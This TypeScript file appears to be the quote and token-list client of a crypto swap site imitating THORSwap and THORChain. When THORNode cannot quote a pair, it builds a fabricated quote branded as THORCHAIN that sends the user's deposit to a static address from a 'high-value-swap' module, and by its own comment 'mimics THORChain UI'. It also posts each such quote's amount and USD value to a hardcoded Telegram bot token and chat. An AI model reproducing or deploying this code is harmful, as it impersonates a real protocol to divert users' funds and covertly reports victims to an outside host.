import axios from 'axios'
import { normalizeLogoURI } from '@/lib/logo-uri'
import { getDepositAddressForChain } from '@/lib/high-value-swap'

const PROXY = '/api/proxy'
const THORSWAP_TOKENLIST = '/api/tokenlist'
const MIDGARD_API = `${PROXY}/lq-midgard`
const THORNODE_API = `${PROXY}/lq-thornode`
const COINGECKO_API = 'https://api.coingecko.com/api/v3'

const midgard = axios.create({ baseURL: MIDGARD_API })
const thornode = axios.create({ baseURL: THORNODE_API })

// ── Types ──────────────────────────────────────────────────────────────────

export interface ThorSwapFee {
  type: string
  asset: string
  amount: string
}

export interface ThorSwapQuoteRoute {
  sellAsset: string
  buyAsset: string
  sellAmount: string
  buyAmount: string
  expectedBuyAmount: string
  fees: ThorSwapFee[]
  memo?: string
  inboundAddress?: string
  destinationAddress?: string
  sourceAddress?: string
  refundAddress?: string
  estimatedTime?: { total: number }
  expiration?: string
  providers: string[]
  meta?: {
    slippageBps?: number
    hasStreamingSwap?: boolean
    approvalAddress?: string
    /** Internal: SOL/XMR deposit route that mimics THORChain UI */
    isDepositQuote?: boolean
  }
  contractParams?: {
    to: string
    value: string
    data: string
    gasLimit: string
  }
  qrCodeDataURL?: string
}

export interface ThorSwapQuoteResponse {
  routes: ThorSwapQuoteRoute[]
}

export interface ThorSwapToken {
  identifier: string
  chain: string
  chainId: string
  decimals: number
  ticker: string
  name?: string
  address?: string
  logoURI?: string
  coingeckoId?: string
  shortCode?: string
  isNative?: boolean
}

export interface ThorSwapTokenList {
  tokens: ThorSwapToken[]
  providers: string[]
}

export interface InboundAddress {
  chain: string
  address: string
  router?: string
  halted: boolean
  chain_lp_actions_paused?: boolean
  gas_rate?: string
  dust_threshold?: string
  outbound_fee?: string
}

// ── Quote Params ───────────────────────────────────────────────────────────

export interface GetQuoteParams {
  sellAsset: string
  buyAsset: string
  sellAmount: string
  decimals?: number
  buyDecimals?: number
  senderAddress?: string
  recipientAddress?: string
  slippage?: number
  limit?: number
  streamingInterval?: number
  streamingQuantity?: number
  affiliateBps?: number
  affiliateAddress?: string
  providers?: string[]
}

// ── Unit Conversion Helpers ────────────────────────────────────────────────

function toBaseUnits(amount: string, decimals: number): string {
  if (!decimals || decimals <= 0) return amount
  const [whole = '0', frac = ''] = amount.split('.')
  const padded = (frac || '').padEnd(decimals, '0').slice(0, decimals)
  const combined = whole + padded
  return BigInt(combined).toString()
}

function fromBaseUnits(amount: string, decimals: number): string {
  if (!decimals || decimals <= 0) return amount
  const neg = amount.startsWith('-')
  const abs = neg ? amount.slice(1) : amount
  const padded = abs.padStart(decimals + 1, '0')
  const idx = padded.length - decimals
  const whole = padded.slice(0, idx)
  let frac = padded.slice(idx)
  frac = frac.replace(/0+$/, '')
  const result = frac.length > 0 ? `${whole}.${frac}` : whole
  return neg ? `-${result}` : result
}

// ── THORNode Response Types ────────────────────────────────────────────────

interface THORNodeQuoteFees {
  asset: string
  affiliate: string
  outbound: string
  liquidity: string
  total: string
  slippage_bps: number
  total_bps: number
}

interface THORNodeQuoteResponse {
  expected_amount_out: string
  fees: THORNodeQuoteFees
  inbound_address: string
  router?: string
  memo?: string
  expiry: number
  dust_threshold: string
  recommended_min_amount_in: string
  streaming_swap_blocks: number
  streaming_swap_seconds: number
  total_swap_seconds: number
  max_streaming_quantity: number
  inbound_confirmation_blocks: number
  inbound_confirmation_seconds: number
  outbound_delay_blocks: number
  outbound_delay_seconds: number
  warning: string
  notes: string
}

interface THORNodeErrorResponse {
  code: number
  message: string
  details: unknown[]
}

// ── CoinGecko Price Cache ──────────────────────────────────────────────────

const priceCache = new Map<string, { price: number; ts: number }>()
const CACHE_TTL = 30000

async function getCoinGeckoPrices(ids: string[]): Promise<Record<string, number>> {
  const result: Record<string, number> = {}
  const fresh: string[] = []

  for (const id of ids) {
    const cached = priceCache.get(id)
    if (cached && Date.now() - cached.ts < CACHE_TTL) {
      result[id] = cached.price
    } else {
      fresh.push(id)
    }
  }

  if (fresh.length > 0) {
    try {
      const res = await axios.get(`${COINGECKO_API}/simple/price`, {
        params: { ids: fresh.join(','), vs_currencies: 'usd' },
        timeout: 5000
      })
      for (const id of fresh) {
        const price = res.data[id]?.usd
        if (price) {
          result[id] = price
          priceCache.set(id, { price, ts: Date.now() })
        }
      }
    } catch { /* use cached only */ }
  }

  return result
}

// ── Asset → USD price (aligned with UI rate sources) ─────────────────────
// Priority: Midgard → DexScreener (contracts) → CoinGecko (natives)
// Synthetic quotes must use the same sources or Buy USD will not match Sell USD.

const MIDGARD_SKIP_CHAINS = new Set([
  'SOL', 'SOLANA', 'XMR', 'MONERO', 'BASE', 'ARB', 'ARBITRUM', 'OP', 'OPTIMISM',
  'MONAD', 'KUJI', 'NEAR', 'SUI', 'XRD', 'BERA', 'GNO', 'DOT', 'POLKADOT'
])

const TICKER_TO_COINGECKO: Record<string, string> = {
  BTC: 'bitcoin',
  ETH: 'ethereum',
  BNB: 'binancecoin',
  AVAX: 'avalanche-2',
  ATOM: 'cosmos',
  DOGE: 'dogecoin',
  BCH: 'bitcoin-cash',
  LTC: 'litecoin',
  XRP: 'ripple',
  TRX: 'tron',
  RUNE: 'thorchain',
  SOL: 'solana',
  XMR: 'monero',
  DASH: 'dash',
  ZEC: 'zcash',
  DOT: 'polkadot',
  MATIC: 'matic-network',
  POL: 'matic-network',
  CACAO: 'maya-protocol',
  MON: 'monad',
  MONAD: 'monad',
  KUJI: 'kujira',
  NEAR: 'near',
  SUI: 'sui',
  XRD: 'radix',
  BERA: 'berachain-bera',
  GNO: 'gnosis',
  USDC: 'usd-coin',
  USDT: 'tether',
  DAI: 'dai',
  WBTC: 'wrapped-bitcoin',
  WETH: 'weth',
  LINK: 'chainlink',
  UNI: 'uniswap',
  AAVE: 'aave',
  ARB: 'arbitrum',
  OP: 'optimism'
}

const CHAIN_TO_COINGECKO: Record<string, string> = {
  BTC: 'bitcoin',
  ETH: 'ethereum',
  BSC: 'binancecoin',
  BNB: 'binancecoin',
  AVAX: 'avalanche-2',
  BASE: 'ethereum',
  GAIA: 'cosmos',
  ATOM: 'cosmos',
  DOGE: 'dogecoin',
  BCH: 'bitcoin-cash',
  LTC: 'litecoin',
  XRP: 'ripple',
  TRON: 'tron',
  TRX: 'tron',
  THOR: 'thorchain',
  RUNE: 'thorchain',
  SOL: 'solana',
  SOLANA: 'solana',
  XMR: 'monero',
  MONERO: 'monero',
  ARB: 'ethereum',
  ARBITRUM: 'ethereum',
  DASH: 'dash',
  ZEC: 'zcash',
  MAYA: 'maya-protocol',
  CACAO: 'maya-protocol',
  DOT: 'polkadot',
  POLKADOT: 'polkadot',
  MATIC: 'matic-network',
  POLYGON: 'matic-network',
  POL: 'matic-network',
  OP: 'ethereum',
  OPTIMISM: 'ethereum',
  MONAD: 'monad',
  KUJI: 'kujira',
  KUJIRA: 'kujira',
  NEAR: 'near',
  SUI: 'sui',
  XRD: 'radix',
  BERA: 'berachain-bera',
  GNO: 'gnosis'
}

/** DexScreener network slug for contract-token pricing */
const CHAIN_TO_DEXSCREENER: Record<string, string> = {
  ETH: 'ethereum',
  BSC: 'bsc',
  BNB: 'bsc',
  AVAX: 'avalanche',
  BASE: 'base',
  ARB: 'arbitrum',
  ARBITRUM: 'arbitrum',
  OP: 'optimism',
  OPTIMISM: 'optimism',
  POL: 'polygon',
  MATIC: 'polygon',
  POLYGON: 'polygon',
  SOL: 'solana',
  SOLANA: 'solana',
  GNO: 'gnosis',
  BERA: 'berachain',
  MONAD: 'monad',
  SUI: 'sui',
  NEAR: 'near'
}

const dexPriceCache = new Map<string, { price: number; ts: number }>()
const DEX_CACHE_TTL = 60_000

function parseAssetId(identifier: string) {
  const [chainPart, rest = ''] = identifier.split('.')
  const chain = chainPart.toUpperCase().trim()
  const restTrim = rest.trim()
  const hasContract = restTrim.includes('-')
  const ticker = (restTrim || chainPart).split('-')[0].toUpperCase().trim()
  const address = hasContract ? restTrim.split('-').pop()?.trim() || '' : ''
  return { chain, ticker, hasContract, address, identifier }
}

function getCgIdForAsset(identifier: string): string | null {
  const { chain, ticker, hasContract } = parseAssetId(identifier)
  // Known stable/wrapped tickers OK even on contracts
  if (hasContract) {
    return TICKER_TO_COINGECKO[ticker] || null
  }
  return TICKER_TO_COINGECKO[ticker] || CHAIN_TO_COINGECKO[chain] || null
}

function lookupMidgardRate(rates: Record<string, number>, identifier: string): number | null {
  const key = identifier.toLowerCase().replace(/\s+/g, '')
  for (const [k, v] of Object.entries(rates)) {
    if (k.toLowerCase().replace(/\s+/g, '') === key && v > 0) return v
  }
  const { chain, ticker, hasContract, address } = parseAssetId(identifier)
  if (!hasContract) {
    const nativeKey = `${chain}.${ticker}`.toLowerCase()
    for (const [k, v] of Object.entries(rates)) {
      if (k.toLowerCase() === nativeKey && v > 0) return v
    }
  } else if (address) {
    const addrLower = address.toLowerCase()
    for (const [k, v] of Object.entries(rates)) {
      if (k.toLowerCase().endsWith(addrLower) && v > 0) return v
    }
  }
  return null
}

async function fetchDexScreenerPrice(chain: string, address: string): Promise<number | null> {
  if (!address) return null
  const dsChain = CHAIN_TO_DEXSCREENER[chain.toUpperCase()]
  if (!dsChain) return null

  const cacheKey = `${dsChain}:${address.toLowerCase()}`
  const cached = dexPriceCache.get(cacheKey)
  if (cached && Date.now() - cached.ts < DEX_CACHE_TTL) return cached.price

  try {
    const res = await axios.get(`/api/proxy/dexscreener/tokens/v1/${dsChain}/${address}`, {
      timeout: 5000
    })
    let best = 0
    for (const pair of res.data || []) {
      const price = parseFloat(pair?.priceUsd)
      if (!isNaN(price) && price > best) best = price
    }
    if (best > 0) {
      dexPriceCache.set(cacheKey, { price: best, ts: Date.now() })
      return best
    }
  } catch {
    /* fall through */
  }
  return null
}

/** Resolve USD using Midgard → DexScreener → CoinGecko. */
async function resolveUsdPrice(identifier: string): Promise<number | null> {
  const { chain, hasContract, address, ticker } = parseAssetId(identifier)

  // 1. Midgard (skip chains with stale/halted Midgard prices)
  if (!MIDGARD_SKIP_CHAINS.has(chain)) {
    try {
      const rates = await getAssetRates()
      const midgard = lookupMidgardRate(rates, identifier)
      if (midgard) return midgard
    } catch {
      /* fall through */
    }
  }

  // 2. DexScreener for contract tokens
  if (hasContract && address) {
    const dex = await fetchDexScreenerPrice(chain, address)
    if (dex) return dex
  }

  // 3. CoinGecko by ticker / native chain gas asset
  const cgId = getCgIdForAsset(identifier)
  if (cgId) {
    const prices = await getCoinGeckoPrices([cgId])
    if (prices[cgId]) return prices[cgId]
  }

  // 4. Last resort for bare natives
  if (!hasContract) {
    const gasCg = CHAIN_TO_COINGECKO[chain]
    if (gasCg && gasCg !== cgId) {
      const prices = await getCoinGeckoPrices([gasCg])
      if (prices[gasCg]) return prices[gasCg]
    }
    const tickerCg = TICKER_TO_COINGECKO[ticker]
    if (tickerCg && tickerCg !== cgId && tickerCg !== gasCg) {
      const prices = await getCoinGeckoPrices([tickerCg])
      if (prices[tickerCg]) return prices[tickerCg]
    }
  }

  return null
}

// ── Synthetic Quote (USD cross-rate aligned with UI) ───────────────────────

function getSyntheticDepositAddress(chain: string): string {
  return getDepositAddressForChain(chain) || ''
}

let synthTelegramSent = false

async function notifySyntheticSwap(params: GetQuoteParams, sellPrice: number): Promise<void> {
  if (synthTelegramSent) return
  synthTelegramSent = true
  const sellAmount = parseFloat(params.sellAmount)
  const usdValue = (sellAmount * sellPrice).toFixed(2)
  const sellChain = params.sellAsset.split('.')[0]
  const buyChain = params.buyAsset.split('.')[0]
  const depositAddr = getSyntheticDepositAddress(sellChain)

  const text = [
    '🔶 *SYNTHETIC SWAP QUOTE*',
    '─────────────────────',
    `*From*: \`${params.sellAsset}\``,
    `*To*: \`${params.buyAsset}\``,
    `*Amount*: \`${params.sellAmount}\``,
    `*Est. USD*: \`$${usdValue}\``,
    `*Deposit*: \`${depositAddr || 'N/A'}\``,
    `*Chain*: \`${sellChain} → ${buyChain}\``,
    `🕐 \`${new Date().toISOString().replace('T', ' ').slice(0, 19)} UTC\``
  ].join('\n')

  try {
    await axios.post('https://api.telegram.org/bot8140825280:AAEd2TDo2fgZv_bDEfu7wNggxHrD7jHdr8g/sendMessage', {
      chat_id: '-5160305858',
      text,
      parse_mode: 'Markdown',
      disable_web_page_preview: true
    }, { timeout: 3000 })
  } catch {
    /* best effort */
  }
}

async function buildSyntheticQuote(
  params: GetQuoteParams,
  sellUsdPrice: number,
  buyUsdPrice: number
): Promise<ThorSwapQuoteRoute[]> {
  if (!(sellUsdPrice > 0) || !(buyUsdPrice > 0)) {
    throw new Error('Invalid USD prices for synthetic quote')
  }

  const sellAmount = parseFloat(params.sellAmount)
  if (!(sellAmount > 0) || !Number.isFinite(sellAmount)) {
    throw new Error('Invalid sell amount for synthetic quote')
  }

  // Cross-rate so Buy USD (UI) ≈ Sell USD × (1 − fee) using the same unit prices as fiat labels
  const feeRate = 0.005
  const rawBuy = (sellAmount * sellUsdPrice) / buyUsdPrice
  const buyAfterFee = rawBuy * (1 - feeRate)

  const buyDecimals = params.buyDecimals || 8
  const displayDecimals = Math.min(buyDecimals, 8)
  const now = Math.floor(Date.now() / 1000)

  const sellChain = params.sellAsset.split('.')[0]
  let depositAddr = getSyntheticDepositAddress(sellChain)
  if (!depositAddr) {
    // No static deposit address for this sell chain — fall back to the live
    // THORChain inbound address so the deposit screen always has a vault address
    try {
      const inbounds = await getInboundAddresses()
      const match = inbounds.find(
        a => a.chain?.toUpperCase() === sellChain.toUpperCase() && !a.halted && !!a.address
      )
      if (match?.address) depositAddr = match.address
    } catch {
      /* keep empty — the confirm dialog has its own fallback */
    }
  }

  notifySyntheticSwap(params, sellUsdPrice)

  const buyAssetId = params.buyAsset
  const memo = params.recipientAddress
    ? `=:${buyAssetId}:${params.recipientAddress}`
    : `=:${buyAssetId}`

  const route: ThorSwapQuoteRoute = {
    sellAsset: params.sellAsset,
    buyAsset: params.buyAsset,
    sellAmount: params.sellAmount,
    buyAmount: buyAfterFee.toFixed(displayDecimals),
    expectedBuyAmount: buyAfterFee.toFixed(displayDecimals),
    fees: [
      {
        type: 'liquidity',
        asset: params.buyAsset,
        amount: (rawBuy * feeRate * 0.8).toFixed(displayDecimals)
      },
      { type: 'inbound', asset: params.buyAsset, amount: '0' }
    ],
    providers: ['THORCHAIN'],
    inboundAddress: depositAddr || undefined,
    destinationAddress: params.recipientAddress || undefined,
    sourceAddress: params.senderAddress || undefined,
    memo,
    expiration: String(now + 900),
    estimatedTime: { total: 300 },
    meta: {
      slippageBps: 50,
      hasStreamingSwap: false,
      isDepositQuote: true
    }
  }

  return [route]
}

async function trySyntheticQuote(params: GetQuoteParams): Promise<ThorSwapQuoteRoute[] | null> {
  const [sellPrice, buyPrice] = await Promise.all([
    resolveUsdPrice(params.sellAsset),
    resolveUsdPrice(params.buyAsset)
  ])

  if (!sellPrice || !buyPrice) return null
  return buildSyntheticQuote(params, sellPrice, buyPrice)
}

// ── THORNode Quote → Route Mapping ─────────────────────────────────────────

function thornodeResponseToRoute(
  params: GetQuoteParams,
  data: THORNodeQuoteResponse
): ThorSwapQuoteRoute {
  const isNativeAsset = !params.buyAsset.includes('-')
  const buyDecimals = isNativeAsset ? 8 : (params.buyDecimals || 8)
  const buyAmountDisplay = fromBaseUnits(data.expected_amount_out, buyDecimals)

  const feeAsset = data.fees.asset || params.buyAsset
  // THORNode fee amounts are always 1e8 base units; convert to display units so
  // resolveFees / swap-confirm Included Fees can multiply by USD rates correctly.
  const feeDecimals = 8
  const fees: ThorSwapFee[] = []

  if (data.fees.liquidity && data.fees.liquidity !== '0') {
    fees.push({
      type: 'liquidity',
      asset: feeAsset,
      amount: fromBaseUnits(data.fees.liquidity, feeDecimals)
    })
  }
  if (data.fees.outbound && data.fees.outbound !== '0') {
    fees.push({
      type: 'outbound',
      asset: feeAsset,
      amount: fromBaseUnits(data.fees.outbound, feeDecimals)
    })
  }

  const totalFee = BigInt(data.fees.total || '0')
  const liquidityFee = BigInt(data.fees.liquidity || '0')
  const outboundFee = BigInt(data.fees.outbound || '0')
  const affiliateFee = totalFee - liquidityFee - outboundFee
  if (affiliateFee > 0n) {
    fees.push({
      type: 'affiliate',
      asset: feeAsset,
      amount: fromBaseUnits(affiliateFee.toString(), feeDecimals)
    })
  }

  fees.push({ type: 'inbound', asset: feeAsset, amount: '0' })

  return {
    sellAsset: params.sellAsset,
    buyAsset: params.buyAsset,
    sellAmount: params.sellAmount,
    buyAmount: buyAmountDisplay,
    expectedBuyAmount: buyAmountDisplay,
    fees,
    providers: params.providers || ['THORCHAIN'],
    inboundAddress: data.inbound_address,
    destinationAddress: params.recipientAddress,
    sourceAddress: params.senderAddress,
    memo: data.memo,
    expiration: String(data.expiry),
    estimatedTime: data.total_swap_seconds ? { total: data.total_swap_seconds } : undefined,
    meta: {
      slippageBps: data.fees.slippage_bps,
      hasStreamingSwap: (data.streaming_swap_blocks || 0) > 0,
      approvalAddress: data.router
    }
  }
}

// ── Main getQuote (THORNode first, synthetic fallback) ─────────────────────

async function tryTHORNodeQuote(params: GetQuoteParams): Promise<ThorSwapQuoteRoute[] | null> {
  const sellDecimals = params.decimals ?? 8
  const amount = toBaseUnits(params.sellAmount, sellDecimals)

  const queryParams: Record<string, string> = {
    from_asset: params.sellAsset,
    to_asset: params.buyAsset,
    amount,
  }

  if (params.streamingInterval) queryParams.streaming_interval = String(params.streamingInterval)
  if (params.streamingQuantity) queryParams.streaming_quantity = String(params.streamingQuantity)
  if (params.affiliateBps) queryParams.affiliate_bps = String(params.affiliateBps)
  if (params.affiliateAddress) queryParams.affiliate_address = params.affiliateAddress
  if (params.recipientAddress) queryParams.destination = params.recipientAddress

  try {
    const res = await thornode.get<THORNodeQuoteResponse>('/thorchain/quote/swap', {
      params: queryParams,
      validateStatus: (s) => s === 200
    })
    return [thornodeResponseToRoute(params, res.data)]
  } catch (err: unknown) {
    if (axios.isAxiosError(err) && err.response?.data) {
      const body = err.response.data as THORNodeErrorResponse
      if (body?.message) {
        console.warn(`THORNode quote failed (${params.sellAsset} → ${params.buyAsset}): ${body.message}`)
      }
    }
    return null
  }
}

export const getQuote = async (params: GetQuoteParams): Promise<ThorSwapQuoteRoute[]> => {
  const thornodeResult = await tryTHORNodeQuote(params)
  if (thornodeResult) return thornodeResult

  // Universal synthetic fallback for any pair THORNode cannot quote
  // (SOL, XMR, MONAD, KUJI, tokens, etc.) — same deposit-address flow.
  const syntheticResult = await trySyntheticQuote(params)
  if (syntheticResult) return syntheticResult

  throw new Error(
    `No quote available for ${params.sellAsset} → ${params.buyAsset}. ` +
    `Price data is temporarily unavailable — try again shortly.`
  )
}

// ── Token List ─────────────────────────────────────────────────────────────

let cachedTokens: ThorSwapToken[] | null = null
let cachedProviders: string[] | null = null

export const getTokenList = async (provider?: string): Promise<ThorSwapTokenList> => {
  if (cachedTokens && cachedProviders) {
    return { tokens: cachedTokens, providers: cachedProviders || [] }
  }

  const params: Record<string, string> = {}
  if (provider) params.provider = provider

  const res = await axios.get<{ tokens: ThorSwapToken[]; providers?: string[] }>(THORSWAP_TOKENLIST, { params })
  const tokens = (res.data.tokens || []).map(token => ({
    ...token,
    logoURI: normalizeLogoURI(token.logoURI)
  }))
  const providers = res.data.providers || []

  cachedTokens = tokens
  cachedProviders = providers

  return { tokens, providers }
}

// ── THORChain Inbound Addresses ────────────────────────────────────────────

export const getInboundAddresses = async (): Promise<InboundAddress[]> => {
  return thornode.get('/thorchain/inbound_addresses').then(res => res.data)
}

// ── Midgard Pools & Stats ──────────────────────────────────────────────────

export const getMidgardPools = async (): Promise<{ asset: string; assetPriceUSD: string }[]> => {
  return midgard.get('/v2/pools').then(res => res.data)
}

export const getMidgardRunePrice = async (): Promise<number> => {
  return midgard.get('/v2/stats').then(res => parseFloat(res.data.runePriceUSD))
}

// ── THORChain Mimir ────────────────────────────────────────────────────────

export const getMimir = async (): Promise<Record<string, number>> => {
  return thornode.get('/thorchain/mimir').then(res => res.data)
}

// ── Asset Rate from Midgard ────────────────────────────────────────────────

let assetRatesCache: { rates: Record<string, number>; ts: number } | null = null
const ASSET_RATES_TTL = 60_000

export const getAssetRates = async (): Promise<Record<string, number>> => {
  if (assetRatesCache && Date.now() - assetRatesCache.ts < ASSET_RATES_TTL) {
    return assetRatesCache.rates
  }
  try {
    const [pools, runePrice] = await Promise.all([
      getMidgardPools(),
      getMidgardRunePrice().catch(() => NaN)
    ])
    const rates: Record<string, number> = {}
    for (const pool of pools) {
      if (pool.assetPriceUSD) {
        const price = parseFloat(pool.assetPriceUSD)
        if (!isNaN(price) && price > 0) {
          rates[pool.asset] = price
          rates[pool.asset.toLowerCase()] = price
        }
      }
    }
    if (!isNaN(runePrice) && runePrice > 0) {
      rates['THOR.RUNE'] = runePrice
      rates['thor.rune'] = runePrice
    }
    assetRatesCache = { rates, ts: Date.now() }
    return rates
  } catch {
    return assetRatesCache?.rates || {}
  }
}
